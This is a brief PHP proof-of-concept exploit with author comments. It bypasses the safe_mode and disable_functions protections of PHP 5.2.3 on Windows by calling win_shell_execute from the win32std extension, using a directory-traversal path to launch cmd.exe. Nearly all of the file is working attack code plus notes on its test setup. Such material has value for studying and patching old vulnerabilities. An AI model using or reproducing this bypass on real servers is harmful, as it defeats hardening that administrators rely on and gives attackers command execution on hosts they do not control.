//PHP 5.2.3 win32std extension safe_mode and disable_functions protections bypass

//Tested on xp Pro sp2 full patched, worked both from the cli and on apache

//Thanks to rgod for all his precious advises :)

//I set php.ini in this way:
//safe_mode = On
//disable_functions = system
//if you launch the exploit from the cli, cmd.exe will be wxecuted
//if you browse it through apache, you'll see a new cmd.exe process activated in taskmanager

if (!extension_loaded(&quot;win32std&quot;)) die(&quot;win32std extension required!&quot;);
system(&quot;cmd.exe&quot;); //just to be sure that protections work well
win_shell_execute(&quot;..\\..\\..\\..\\windows\\system32\\cmd.exe&quot;);
